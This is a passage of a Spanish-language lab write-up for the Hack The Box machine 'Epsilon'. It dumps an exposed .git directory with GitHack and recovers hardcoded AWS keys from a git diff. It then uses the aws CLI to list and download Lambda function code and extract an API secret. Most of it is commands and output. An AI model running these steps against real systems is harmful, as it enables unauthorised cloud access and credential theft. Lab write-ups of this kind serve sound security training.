+<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="o">&gt;&gt;&gt;</span> <span class="nb">print</span><span class="p">(</span><span class="n">decompressed_data</span><span class="p">)</span>
+<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="sa">b</span><span class="s1">&#39;commit 205</span><span class="se">\x00</span><span class="s1">tree b5f4c99c772eeb629e53d284275458d75ed9a010</span><span class="se">\n</span><span class="s1">parent b10dd06d56ac760efbbb5d254ea43bf9beb56d2d</span><span class="se">\n</span><span class="s1">author root &lt;root@epsilon.htb&gt; 1637170867 +0000</span><span class="se">\n</span><span class="s1">committer root &lt;root@epsilon.htb&gt; 1637170867 +0000</span><span class="se">\n\n</span><span class="s1">Fixed Typo</span><span class="se">\n</span><span class="s1">&#39;</span>
+<a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="o">&gt;&gt;&gt;</span> <span class="nb">print</span><span class="p">(</span><span class="n">decompressed_data</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+<a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="n">commit</span> <span class="mi">205</span><span class="n">tree</span> <span class="n">b5f4c99c772eeb629e53d284275458d75ed9a010</span>
+<a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a><span class="n">parent</span> <span class="n">b10dd06d56ac760efbbb5d254ea43bf9beb56d2d</span>
+<a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a><span class="n">author</span> <span class="n">root</span> <span class="o">&lt;</span><span class="n">root</span><span class="nd">@epsilon</span><span class="o">.</span><span class="n">htb</span><span class="o">&gt;</span> <span class="mi">1637170867</span> <span class="o">+</span><span class="mi">0000</span>
+<a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a><span class="n">committer</span> <span class="n">root</span> <span class="o">&lt;</span><span class="n">root</span><span class="nd">@epsilon</span><span class="o">.</span><span class="n">htb</span><span class="o">&gt;</span> <span class="mi">1637170867</span> <span class="o">+</span><span class="mi">0000</span>
+<a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a>
+<a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a><span class="c1">## Alternativa para descargar el repositorio:</span>
+<a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a><span class="n">pip</span> <span class="n">install</span> <span class="n">GitHack</span>
+<a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a>
+<a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a><span class="n">githack</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">epsilon</span><span class="o">.</span><span class="n">htb</span><span class="o">/.</span><span class="n">git</span>
+<a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a><span class="n">INFO</span><span class="p">:</span><span class="n">githack</span><span class="o">.</span><span class="n">scanner</span><span class="p">:</span><span class="n">Target</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">epsilon</span><span class="o">.</span><span class="n">htb</span><span class="o">/.</span><span class="n">git</span><span class="o">/</span>
+<a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a><span class="n">ERROR</span><span class="p">:</span><span class="n">githack</span><span class="o">.</span><span class="n">scanner</span><span class="p">:</span><span class="n">HTTP</span> <span class="n">Error</span> <span class="mi">404</span><span class="p">:</span> <span class="n">Not</span> <span class="n">Found</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">epsilon</span><span class="o">.</span><span class="n">htb</span><span class="o">/.</span><span class="n">git</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">refs</span><span class="o">/</span><span class="n">stash</span>
+<a id="__codelineno-4-24" name="__codelineno-4-24" href="#__codelineno-4-24"></a><span class="n">ERROR</span><span class="p">:</span><span class="n">githack</span><span class="o">.</span><span class="n">scanner</span><span class="p">:</span><span class="n">HTTP</span> <span class="n">Error</span> <span class="mi">404</span><span class="p">:</span> <span class="n">Not</span> <span class="n">Found</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">epsilon</span><span class="o">.</span><span class="n">htb</span><span class="o">/.</span><span class="n">git</span><span class="o">/</span><span class="n">refs</span><span class="o">/</span><span class="n">stash</span>
+<a id="__codelineno-4-25" name="__codelineno-4-25" href="#__codelineno-4-25"></a><span class="n">ERROR</span><span class="p">:</span><span class="n">githack</span><span class="o">.</span><span class="n">scanner</span><span class="p">:</span><span class="n">HTTP</span> <span class="n">Error</span> <span class="mi">404</span><span class="p">:</span> <span class="n">Not</span> <span class="n">Found</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">epsilon</span><span class="o">.</span><span class="n">htb</span><span class="o">/.</span><span class="n">git</span><span class="o">/</span><span class="n">refs</span><span class="o">/</span><span class="n">remotes</span><span class="o">/</span><span class="n">origin</span><span class="o">/</span><span class="n">master</span>
+<a id="__codelineno-4-26" name="__codelineno-4-26" href="#__codelineno-4-26"></a><span class="n">INFO</span><span class="p">:</span><span class="n">githack</span><span class="o">.</span><span class="n">scanner</span><span class="p">:</span><span class="n">commit</span><span class="p">:</span> <span class="n">c51441640fd25e9fba42725147595b5918eba0f1</span>
+<a id="__codelineno-4-27" name="__codelineno-4-27" href="#__codelineno-4-27"></a><span class="n">INFO</span><span class="p">:</span><span class="n">githack</span><span class="o">.</span><span class="n">scanner</span><span class="p">:</span><span class="n">commit</span><span class="p">:</span> <span class="n">c622771686bd74c16ece91193d29f85b5f9ffa91</span>
+<a id="__codelineno-4-28" name="__codelineno-4-28" href="#__codelineno-4-28"></a><span class="n">INFO</span><span class="p">:</span><span class="n">githack</span><span class="o">.</span><span class="n">scanner</span><span class="p">:</span><span class="n">commit</span><span class="p">:</span> <span class="mi">7</span><span class="n">cf92a7a09e523c1c667d13847c9ba22464412f3</span>
+<a id="__codelineno-4-29" name="__codelineno-4-29" href="#__codelineno-4-29"></a><span class="n">INFO</span><span class="p">:</span><span class="n">githack</span><span class="o">.</span><span class="n">scanner</span><span class="p">:</span><span class="n">tree</span><span class="p">:</span> <span class="n">cf489a3776d2bf87ac32de4579e852a4dc116ce8</span>
+<a id="__codelineno-4-30" name="__codelineno-4-30" href="#__codelineno-4-30"></a><span class="n">INFO</span><span class="p">:</span><span class="n">githack</span><span class="o">.</span><span class="n">scanner</span><span class="p">:</span><span class="n">tree</span><span class="p">:</span> <span class="n">b5f4c99c772eeb629e53d284275458d75ed9a010</span>
+<a id="__codelineno-4-31" name="__codelineno-4-31" href="#__codelineno-4-31"></a><span class="n">INFO</span><span class="p">:</span><span class="n">githack</span><span class="o">.</span><span class="n">scanner</span><span class="p">:</span><span class="n">Blob</span><span class="p">:</span> <span class="mi">545</span><span class="n">f6fe2204336c1ea21720cbaa47572eb566e34</span>
+<a id="__codelineno-4-32" name="__codelineno-4-32" href="#__codelineno-4-32"></a><span class="n">INFO</span><span class="p">:</span><span class="n">githack</span><span class="o">.</span><span class="n">scanner</span><span class="p">:</span><span class="n">commit</span><span class="p">:</span> <span class="n">b10dd06d56ac760efbbb5d254ea43bf9beb56d2d</span>
+<a id="__codelineno-4-33" name="__codelineno-4-33" href="#__codelineno-4-33"></a><span class="n">INFO</span><span class="p">:</span><span class="n">githack</span><span class="o">.</span><span class="n">scanner</span><span class="p">:</span><span class="n">tree</span><span class="p">:</span> <span class="n">ab07f7cdc7f410b8c8f848ee5674ec550ecb61ca</span>
+<a id="__codelineno-4-34" name="__codelineno-4-34" href="#__codelineno-4-34"></a><span class="n">INFO</span><span class="p">:</span><span class="n">githack</span><span class="o">.</span><span class="n">scanner</span><span class="p">:</span><span class="n">Blob</span><span class="p">:</span> <span class="mi">8</span><span class="n">d3b52e153c7d5380b183bbbb51f5d4020944630</span>
+<a id="__codelineno-4-35" name="__codelineno-4-35" href="#__codelineno-4-35"></a><span class="n">INFO</span><span class="p">:</span><span class="n">githack</span><span class="o">.</span><span class="n">scanner</span><span class="p">:</span><span class="n">Blob</span><span class="p">:</span> <span class="n">dfdfa17ca5701b1dca5069b6c3f705a038f4361e</span>
+<a id="__codelineno-4-36" name="__codelineno-4-36" href="#__codelineno-4-36"></a><span class="n">INFO</span><span class="p">:</span><span class="n">githack</span><span class="o">.</span><span class="n">scanner</span><span class="p">:</span><span class="n">Blob</span><span class="p">:</span> <span class="n">fed7ab97cf361914f688f0e4f2d3adfafd1d7dca</span>
+<a id="__codelineno-4-37" name="__codelineno-4-37" href="#__codelineno-4-37"></a><span class="n">INFO</span><span class="p">:</span><span class="n">githack</span><span class="o">.</span><span class="n">scanner</span><span class="p">:</span><span class="n">tree</span><span class="p">:</span> <span class="mi">65</span><span class="n">b80f62da28254f67f0bea392057fd7d2330e2d</span>
+<a id="__codelineno-4-38" name="__codelineno-4-38" href="#__codelineno-4-38"></a><span class="n">INFO</span><span class="p">:</span><span class="n">githack</span><span class="o">.</span><span class="n">scanner</span><span class="p">:</span><span class="n">Total</span><span class="p">:</span> <span class="mi">2</span>
+<a id="__codelineno-4-39" name="__codelineno-4-39" href="#__codelineno-4-39"></a><span class="n">INFO</span><span class="p">:</span><span class="n">githack</span><span class="o">.</span><span class="n">scanner</span><span class="p">:[</span><span class="n">OK</span><span class="p">]</span> <span class="n">track_api_CR_148</span><span class="o">.</span><span class="n">py</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;8d3b52e153c7d5380b183bbbb51f5d4020944630&#39;</span><span class="p">,</span> <span class="s1">&#39;blob&#39;</span><span class="p">)</span>
+<a id="__codelineno-4-40" name="__codelineno-4-40" href="#__codelineno-4-40"></a><span class="n">INFO</span><span class="p">:</span><span class="n">githack</span><span class="o">.</span><span class="n">scanner</span><span class="p">:[</span><span class="n">OK</span><span class="p">]</span> <span class="n">server</span><span class="o">.</span><span class="n">py</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;dfdfa17ca5701b1dca5069b6c3f705a038f4361e&#39;</span><span class="p">,</span> <span class="s1">&#39;blob&#39;</span><span class="p">)</span>
+</code></pre></div>
+</li>
+</ul>
+<h2 id="hacking-aws-lambda">Hacking AWS - LAMBDA</h2>
+<ul>
+<li>
+<p>Tras usar la alternativa se puede analizar el repositorio con mas profundidad:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># Se obtienen las keys de AWS</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>&gt; lla   
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>drwxr-xr-x root root  <span class="m">64</span> B  Thu Sep  <span class="m">1</span> <span class="m">22</span>:38:02 <span class="m">2022</span>  .
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>drwxr-xr-x root root  <span class="m">22</span> B  Thu Sep  <span class="m">1</span> <span class="m">22</span>:38:01 <span class="m">2022</span>  ..
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>drwxr-xr-x root root  <span class="m">78</span> B  Thu Sep  <span class="m">1</span> <span class="m">22</span>:43:49 <span class="m">2022</span>  .git
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>.rw-r--r-- root root <span class="m">1</span>.6 KB Thu Sep  <span class="m">1</span> <span class="m">22</span>:38:02 <span class="m">2022</span>  server.py
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>.rw-r--r-- root root <span class="m">1</span>.1 KB Thu Sep  <span class="m">1</span> <span class="m">22</span>:38:02 <span class="m">2022</span>  track_api_CR_148.py
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>&gt; git log                                                 
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>commit c622771686bd74c16ece91193d29f85b5f9ffa91 <span class="o">(</span>HEAD -&gt; master<span class="o">)</span>
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>Author: root &lt;root@epsilon.htb&gt;
+<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>Date:   Wed Nov <span class="m">17</span> <span class="m">17</span>:41:07 <span class="m">2021</span> +0000
+<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>
+<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>    Fixed Typo
+<a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>
+<a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a>commit b10dd06d56ac760efbbb5d254ea43bf9beb56d2d
+<a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a>Author: root &lt;root@epsilon.htb&gt;
+<a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a>Date:   Wed Nov <span class="m">17</span> <span class="m">10</span>:02:59 <span class="m">2021</span> +0000
+<a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a>
+<a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a>    Adding Costume Site
+<a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a>
+<a id="__codelineno-5-22" name="__codelineno-5-22" href="#__codelineno-5-22"></a>commit c51441640fd25e9fba42725147595b5918eba0f1
+<a id="__codelineno-5-23" name="__codelineno-5-23" href="#__codelineno-5-23"></a>Author: root &lt;root@epsilon.htb&gt;
+<a id="__codelineno-5-24" name="__codelineno-5-24" href="#__codelineno-5-24"></a>Date:   Wed Nov <span class="m">17</span> <span class="m">10</span>:00:58 <span class="m">2021</span> +0000
+<a id="__codelineno-5-25" name="__codelineno-5-25" href="#__codelineno-5-25"></a>
+<a id="__codelineno-5-26" name="__codelineno-5-26" href="#__codelineno-5-26"></a>    Updatig Tracking API
+<a id="__codelineno-5-27" name="__codelineno-5-27" href="#__codelineno-5-27"></a>
+<a id="__codelineno-5-28" name="__codelineno-5-28" href="#__codelineno-5-28"></a>commit 7cf92a7a09e523c1c667d13847c9ba22464412f3
+<a id="__codelineno-5-29" name="__codelineno-5-29" href="#__codelineno-5-29"></a>Author: root &lt;root@epsilon.htb&gt;
+<a id="__codelineno-5-30" name="__codelineno-5-30" href="#__codelineno-5-30"></a>Date:   Wed Nov <span class="m">17</span> <span class="m">10</span>:00:28 <span class="m">2021</span> +0000
+<a id="__codelineno-5-31" name="__codelineno-5-31" href="#__codelineno-5-31"></a>
+<a id="__codelineno-5-32" name="__codelineno-5-32" href="#__codelineno-5-32"></a>    Adding Tracking API Module
+<a id="__codelineno-5-33" name="__codelineno-5-33" href="#__codelineno-5-33"></a><span class="c1"># Con git show tambien lo muestra:</span>
+<a id="__codelineno-5-34" name="__codelineno-5-34" href="#__codelineno-5-34"></a>&gt; git diff 7cf92a7a09e523c1c667d13847c9ba22464412f3
+<a id="__codelineno-5-35" name="__codelineno-5-35" href="#__codelineno-5-35"></a>-    <span class="nv">aws_access_key_id</span><span class="o">=</span><span class="s1">&#39;AQLA5M37BDN6FJP76TDC&#39;</span>,
+<a id="__codelineno-5-36" name="__codelineno-5-36" href="#__codelineno-5-36"></a>-    <span class="nv">aws_secret_access_key</span><span class="o">=</span><span class="s1">&#39;OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A&#39;</span>,
+<a id="__codelineno-5-37" name="__codelineno-5-37" href="#__codelineno-5-37"></a>+    <span class="nv">aws_access_key_id</span><span class="o">=</span><span class="s1">&#39;&lt;aws_access_key_id&gt;&#39;</span>,
+<a id="__codelineno-5-38" name="__codelineno-5-38" href="#__codelineno-5-38"></a>+    <span class="nv">aws_secret_access_key</span><span class="o">=</span><span class="s1">&#39;&lt;aws_secret_access_key&gt;&#39;</span>,
+<a id="__codelineno-5-39" name="__codelineno-5-39" href="#__codelineno-5-39"></a>    <span class="nv">region_name</span><span class="o">=</span><span class="s1">&#39;us-east-1&#39;</span>,
+<a id="__codelineno-5-40" name="__codelineno-5-40" href="#__codelineno-5-40"></a>-    <span class="nv">endpoint_url</span><span class="o">=</span><span class="s1">&#39;http://cloud.epsilong.htb&#39;</span><span class="o">)</span>
+<a id="__codelineno-5-41" name="__codelineno-5-41" href="#__codelineno-5-41"></a>-aws_lambda <span class="o">=</span> session.client<span class="o">(</span><span class="s1">&#39;lambda&#39;</span><span class="o">)</span>    
+<a id="__codelineno-5-42" name="__codelineno-5-42" href="#__codelineno-5-42"></a>+    <span class="nv">endpoint_url</span><span class="o">=</span><span class="s1">&#39;http://cloud.epsilon.htb&#39;</span><span class="o">)</span>
+<a id="__codelineno-5-43" name="__codelineno-5-43" href="#__codelineno-5-43"></a>+aws_lambda <span class="o">=</span> session.client<span class="o">(</span><span class="s1">&#39;lambda&#39;</span><span class="o">)</span>
+</code></pre></div>
+</li>
+<li>
+<p>Se accede desde el cli de aws:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>&gt; aws configure
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>&gt; aws --endpoint-url<span class="o">=</span><span class="s2">&quot;http://cloud.epsilon.htb&quot;</span> lambda list-functions
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="o">{</span>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>    <span class="s2">&quot;Functions&quot;</span>: <span class="o">[</span>
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>        <span class="o">{</span>
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>            <span class="s2">&quot;FunctionName&quot;</span>: <span class="s2">&quot;costume_shop_v1&quot;</span>,
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>            <span class="s2">&quot;FunctionArn&quot;</span>: <span class="s2">&quot;arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1&quot;</span>,
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>            <span class="s2">&quot;Runtime&quot;</span>: <span class="s2">&quot;python3.7&quot;</span>,
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>            <span class="s2">&quot;Role&quot;</span>: <span class="s2">&quot;arn:aws:iam::123456789012:role/service-role/dev&quot;</span>,
+<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>            <span class="s2">&quot;Handler&quot;</span>: <span class="s2">&quot;my-function.handler&quot;</span>,
+<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>            <span class="s2">&quot;CodeSize&quot;</span>: <span class="m">478</span>,
+<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>            <span class="s2">&quot;Description&quot;</span>: <span class="s2">&quot;&quot;</span>,
+<a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a>            <span class="s2">&quot;Timeout&quot;</span>: <span class="m">3</span>,
+<a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>            <span class="s2">&quot;LastModified&quot;</span>: <span class="s2">&quot;2022-09-01T01:32:48.353+0000&quot;</span>,
+<a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a>            <span class="s2">&quot;CodeSha256&quot;</span>: <span class="s2">&quot;IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=&quot;</span>,
+<a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a>            <span class="s2">&quot;Version&quot;</span>: <span class="s2">&quot;</span><span class="nv">$LATEST</span><span class="s2">&quot;</span>,
+<a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a>            <span class="s2">&quot;VpcConfig&quot;</span>: <span class="o">{}</span>,
+<a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a>            <span class="s2">&quot;TracingConfig&quot;</span>: <span class="o">{</span>
+<a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a>                <span class="s2">&quot;Mode&quot;</span>: <span class="s2">&quot;PassThrough&quot;</span>
+<a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a>            <span class="o">}</span>,
+<a id="__codelineno-6-21" name="__codelineno-6-21" href="#__codelineno-6-21"></a>            <span class="s2">&quot;RevisionId&quot;</span>: <span class="s2">&quot;969dca3e-3a03-45bd-a4dd-6af102253cc5&quot;</span>,
+<a id="__codelineno-6-22" name="__codelineno-6-22" href="#__codelineno-6-22"></a>            <span class="s2">&quot;State&quot;</span>: <span class="s2">&quot;Active&quot;</span>,
+<a id="__codelineno-6-23" name="__codelineno-6-23" href="#__codelineno-6-23"></a>            <span class="s2">&quot;LastUpdateStatus&quot;</span>: <span class="s2">&quot;Successful&quot;</span>,
+<a id="__codelineno-6-24" name="__codelineno-6-24" href="#__codelineno-6-24"></a>            <span class="s2">&quot;PackageType&quot;</span>: <span class="s2">&quot;Zip&quot;</span>
+<a id="__codelineno-6-25" name="__codelineno-6-25" href="#__codelineno-6-25"></a>        <span class="o">}</span>
+<a id="__codelineno-6-26" name="__codelineno-6-26" href="#__codelineno-6-26"></a>    <span class="o">]</span>
+<a id="__codelineno-6-27" name="__codelineno-6-27" href="#__codelineno-6-27"></a><span class="o">}</span>
+<a id="__codelineno-6-28" name="__codelineno-6-28" href="#__codelineno-6-28"></a>
+<a id="__codelineno-6-29" name="__codelineno-6-29" href="#__codelineno-6-29"></a><span class="c1"># De este modo conseguimos la ruta de la única función existe:</span>
+<a id="__codelineno-6-30" name="__codelineno-6-30" href="#__codelineno-6-30"></a>&gt; aws --endpoint-url<span class="o">=</span><span class="s2">&quot;http://cloud.epsilon.htb&quot;</span> lambda get-function --function-name<span class="o">=</span>costume_shop_v1
+<a id="__codelineno-6-31" name="__codelineno-6-31" href="#__codelineno-6-31"></a><span class="o">{</span>
+<a id="__codelineno-6-32" name="__codelineno-6-32" href="#__codelineno-6-32"></a>    <span class="s2">&quot;Configuration&quot;</span>: <span class="o">{</span>
+<a id="__codelineno-6-33" name="__codelineno-6-33" href="#__codelineno-6-33"></a>        <span class="s2">&quot;FunctionName&quot;</span>: <span class="s2">&quot;costume_shop_v1&quot;</span>,
+<a id="__codelineno-6-34" name="__codelineno-6-34" href="#__codelineno-6-34"></a>        <span class="s2">&quot;FunctionArn&quot;</span>: <span class="s2">&quot;arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1&quot;</span>,
+<a id="__codelineno-6-35" name="__codelineno-6-35" href="#__codelineno-6-35"></a>        <span class="s2">&quot;Runtime&quot;</span>: <span class="s2">&quot;python3.7&quot;</span>,
+<a id="__codelineno-6-36" name="__codelineno-6-36" href="#__codelineno-6-36"></a>        <span class="s2">&quot;Role&quot;</span>: <span class="s2">&quot;arn:aws:iam::123456789012:role/service-role/dev&quot;</span>,
+<a id="__codelineno-6-37" name="__codelineno-6-37" href="#__codelineno-6-37"></a>        <span class="s2">&quot;Handler&quot;</span>: <span class="s2">&quot;my-function.handler&quot;</span>,
+<a id="__codelineno-6-38" name="__codelineno-6-38" href="#__codelineno-6-38"></a>        <span class="s2">&quot;CodeSize&quot;</span>: <span class="m">478</span>,
+<a id="__codelineno-6-39" name="__codelineno-6-39" href="#__codelineno-6-39"></a>        <span class="s2">&quot;Description&quot;</span>: <span class="s2">&quot;&quot;</span>,
+<a id="__codelineno-6-40" name="__codelineno-6-40" href="#__codelineno-6-40"></a>        <span class="s2">&quot;Timeout&quot;</span>: <span class="m">3</span>,
+<a id="__codelineno-6-41" name="__codelineno-6-41" href="#__codelineno-6-41"></a>        <span class="s2">&quot;LastModified&quot;</span>: <span class="s2">&quot;2022-09-01T01:32:48.353+0000&quot;</span>,
+<a id="__codelineno-6-42" name="__codelineno-6-42" href="#__codelineno-6-42"></a>        <span class="s2">&quot;CodeSha256&quot;</span>: <span class="s2">&quot;IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=&quot;</span>,
+<a id="__codelineno-6-43" name="__codelineno-6-43" href="#__codelineno-6-43"></a>        <span class="s2">&quot;Version&quot;</span>: <span class="s2">&quot;</span><span class="nv">$LATEST</span><span class="s2">&quot;</span>,
+<a id="__codelineno-6-44" name="__codelineno-6-44" href="#__codelineno-6-44"></a>        <span class="s2">&quot;VpcConfig&quot;</span>: <span class="o">{}</span>,
+<a id="__codelineno-6-45" name="__codelineno-6-45" href="#__codelineno-6-45"></a>        <span class="s2">&quot;TracingConfig&quot;</span>: <span class="o">{</span>
+<a id="__codelineno-6-46" name="__codelineno-6-46" href="#__codelineno-6-46"></a>            <span class="s2">&quot;Mode&quot;</span>: <span class="s2">&quot;PassThrough&quot;</span>
+<a id="__codelineno-6-47" name="__codelineno-6-47" href="#__codelineno-6-47"></a>        <span class="o">}</span>,
+<a id="__codelineno-6-48" name="__codelineno-6-48" href="#__codelineno-6-48"></a>        <span class="s2">&quot;RevisionId&quot;</span>: <span class="s2">&quot;969dca3e-3a03-45bd-a4dd-6af102253cc5&quot;</span>,
+<a id="__codelineno-6-49" name="__codelineno-6-49" href="#__codelineno-6-49"></a>        <span class="s2">&quot;State&quot;</span>: <span class="s2">&quot;Active&quot;</span>,
+<a id="__codelineno-6-50" name="__codelineno-6-50" href="#__codelineno-6-50"></a>        <span class="s2">&quot;LastUpdateStatus&quot;</span>: <span class="s2">&quot;Successful&quot;</span>,
+<a id="__codelineno-6-51" name="__codelineno-6-51" href="#__codelineno-6-51"></a>        <span class="s2">&quot;PackageType&quot;</span>: <span class="s2">&quot;Zip&quot;</span>
+<a id="__codelineno-6-52" name="__codelineno-6-52" href="#__codelineno-6-52"></a>    <span class="o">}</span>,
+<a id="__codelineno-6-53" name="__codelineno-6-53" href="#__codelineno-6-53"></a>    <span class="s2">&quot;Code&quot;</span>: <span class="o">{</span>
+<a id="__codelineno-6-54" name="__codelineno-6-54" href="#__codelineno-6-54"></a>        <span class="s2">&quot;Location&quot;</span>: <span class="s2">&quot;http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code&quot;</span>
+<a id="__codelineno-6-55" name="__codelineno-6-55" href="#__codelineno-6-55"></a>    <span class="o">}</span>,
+<a id="__codelineno-6-56" name="__codelineno-6-56" href="#__codelineno-6-56"></a>    <span class="s2">&quot;Tags&quot;</span>: <span class="o">{}</span>
+<a id="__codelineno-6-57" name="__codelineno-6-57" href="#__codelineno-6-57"></a><span class="o">}</span>
+<a id="__codelineno-6-58" name="__codelineno-6-58" href="#__codelineno-6-58"></a>
+<a id="__codelineno-6-59" name="__codelineno-6-59" href="#__codelineno-6-59"></a><span class="c1"># Se descarga el código de la función, tener en cuenta que viene zipeado:</span>
+<a id="__codelineno-6-60" name="__codelineno-6-60" href="#__codelineno-6-60"></a>&gt;  curl <span class="s1">&#39;http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code&#39;</span> --output codigo.zip
+<a id="__codelineno-6-61" name="__codelineno-6-61" href="#__codelineno-6-61"></a>&gt; unzip codigo.zip                         
+<a id="__codelineno-6-62" name="__codelineno-6-62" href="#__codelineno-6-62"></a>    Archive:  codigo
+<a id="__codelineno-6-63" name="__codelineno-6-63" href="#__codelineno-6-63"></a>    inflating: lambda_function.py 
+<a id="__codelineno-6-64" name="__codelineno-6-64" href="#__codelineno-6-64"></a>
+<a id="__codelineno-6-65" name="__codelineno-6-65" href="#__codelineno-6-65"></a><span class="c1"># Se obtiene el secret:</span>
+<a id="__codelineno-6-66" name="__codelineno-6-66" href="#__codelineno-6-66"></a>&gt; catn lambda_function.py
+<a id="__codelineno-6-67" name="__codelineno-6-67" href="#__codelineno-6-67"></a>import json
+<a id="__codelineno-6-68" name="__codelineno-6-68" href="#__codelineno-6-68"></a>
+<a id="__codelineno-6-69" name="__codelineno-6-69" href="#__codelineno-6-69"></a><span class="nv">secret</span><span class="o">=</span><span class="s1">&#39;RrXCv`mrNe!K!4+5`wYq&#39;</span> <span class="c1">#apigateway authorization for CR-124</span>
+<a id="__codelineno-6-70" name="__codelineno-6-70" href="#__codelineno-6-70"></a>
+<a id="__codelineno-6-71" name="__codelineno-6-71" href="#__codelineno-6-71"></a><span class="s1">&#39;&#39;&#39;Beta release for tracking&#39;&#39;&#39;</span>
+<a id="__codelineno-6-72" name="__codelineno-6-72" href="#__codelineno-6-72"></a>def lambda_handler<span class="o">(</span>event, context<span class="o">)</span>:
+<a id="__codelineno-6-73" name="__codelineno-6-73" href="#__codelineno-6-73"></a>    try:
+<a id="__codelineno-6-74" name="__codelineno-6-74" href="#__codelineno-6-74"></a>        <span class="nv">id</span><span class="o">=</span>event<span class="o">[</span><span class="s1">&#39;queryStringParameters&#39;</span><span class="o">][</span><span class="s1">&#39;order_id&#39;</span><span class="o">]</span>
+<a id="__codelineno-6-75" name="__codelineno-6-75" href="#__codelineno-6-75"></a>        <span class="k">if</span> id:
+<a id="__codelineno-6-76" name="__codelineno-6-76" href="#__codelineno-6-76"></a>            <span class="k">return</span> <span class="o">{</span>
+<a id="__codelineno-6-77" name="__codelineno-6-77" href="#__codelineno-6-77"></a>            <span class="s1">&#39;statusCode&#39;</span>: <span class="m">200</span>,
